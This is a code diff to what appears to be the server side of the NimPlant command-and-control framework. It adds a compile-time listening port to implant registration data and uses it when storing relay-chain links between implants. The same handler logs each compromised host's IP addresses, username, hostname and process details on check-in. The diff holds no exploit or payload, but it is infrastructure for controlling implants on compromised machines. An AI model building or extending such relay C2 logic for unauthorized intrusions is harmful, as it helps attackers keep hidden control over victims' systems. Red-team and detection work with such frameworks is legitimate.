@@ -164,12 +164,15 @@ def nim_implants_server(xor_key):
                         process_name = data_json["P"]
                         risky_mode = data_json["r"]
                         relay_role = data_json.get("R", "STANDARD")  # Default to STANDARD if not provided
+                        listening_port = data_json.get("L", 0)  # Get listening port, default to 0
                         
                         utils.nimplant_print(f"DEBUG: Activation data - Internal IP: {ip_internal}, External IP: {ip_external}")
                         utils.nimplant_print(f"DEBUG: Activation data - Username: {username}, Hostname: {hostname}")
                         utils.nimplant_print(f"DEBUG: Activation data - OS: {os_build}, PID: {pid}, Process: {process_name}")
                         utils.nimplant_print(f"DEBUG: Activation data - Risky mode: {risky_mode}")
                         utils.nimplant_print(f"DEBUG: Activation data - Relay role: {relay_role}")
+                        if listening_port > 0:
+                            utils.nimplant_print(f"DEBUG: Activation data - Listening port (compile-time): {listening_port}")
 
                         np.activate(
                             ip_external,
@@ -219,7 +222,7 @@ def nim_implants_server(xor_key):
                                 
                                 # Store relationship for this implant -> first relay
                                 first_relay_guid = decrypted_guids[0]
-                                listening_port = 0  # Will be updated if this implant also starts relay server
+                                # Use the listening_port from registration data (already extracted above)
                                 if db.db_store_chain_relationship(np.guid, first_relay_guid, relay_role, listening_port):
                                     utils.nimplant_print(f"DEBUG: 🔗 ✅ Stored: {np.guid} -> parent: {first_relay_guid}")
                                 else:
@@ -251,7 +254,11 @@ def nim_implants_server(xor_key):
                         else:
                             utils.nimplant_print(f"DEBUG: 🔗 No X-Relay-GUID header - direct C2 connection")
                             # Store with null parent ONLY if this is a relay server (not standard agent)
-                            if relay_role == "RELAY_SERVER":
+                            if relay_role == "RELAY_SERVER" and listening_port > 0:
+                                utils.nimplant_print(f"DEBUG: 🔗 Storing relay server with compile-time port: {listening_port}")
+                                db.db_store_chain_relationship(np.guid, None, relay_role, listening_port)
+                            elif relay_role == "RELAY_SERVER":
+                                utils.nimplant_print(f"DEBUG: 🔗 Relay server but no listening port provided yet")
                                 db.db_store_chain_relationship(np.guid, None, relay_role, 0)
 
                         notify_user(np)
